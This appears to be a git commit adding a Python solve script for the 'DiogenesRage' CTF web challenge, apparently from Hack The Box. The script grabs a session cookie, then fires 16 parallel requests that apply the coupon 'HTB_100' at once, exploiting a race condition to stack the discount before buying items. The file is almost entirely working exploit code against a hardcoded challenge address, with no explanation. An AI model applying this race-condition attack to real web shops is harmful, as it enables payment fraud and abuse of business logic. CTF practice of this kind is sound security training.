6fcb6be44785cbb63f8ca00d823995706fd74fc7
szhan21 <shunda.zhang@intel.com>
2023-04-13 21:17:43 +0800

    Solving DiogenesRage.

---
+++ ctf/web/DiogenesRage/dec.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python
+
+from concurrent.futures import process
+from email import header
+from multiprocessing import Process, Pool
+from threading import Thread
+import requests
+
+ip = 'http://134.122.104.91:31894/'
+
+def race(cookie):
+    headers = {
+        'Cookie': f'session={cookie}'
+    }
+    try:
+        req = requests.post(ip+'/api/coupons/apply', data={'coupon_code': 'HTB_100'}, headers=headers)
+        print(req.text)
+    except Exception:
+        pass
+
+
+if __name__ == '__main__':
+    req = requests.post(ip+'/api/purchase', data={'item': 'C8'})
+    cookie = req.cookies['session']
+    ps = []
+    for x in range(16):
+        p = Process(target=race, args=(cookie, ))
+        ps.append(p)
+
+    for p in ps:
+        p.start()
+
+    for p in ps:
+        p.join()
+
+    req = requests.post(ip+'/api/purchase', data={'item': 'B5'}, headers={'Cookie': f'session={cookie}'})
+    print(req.text)
+
+    req = requests.post(ip+'/api/purchase', data={'item': 'C8'}, headers={'Cookie': f'session={cookie}'})
+    print(req.text)
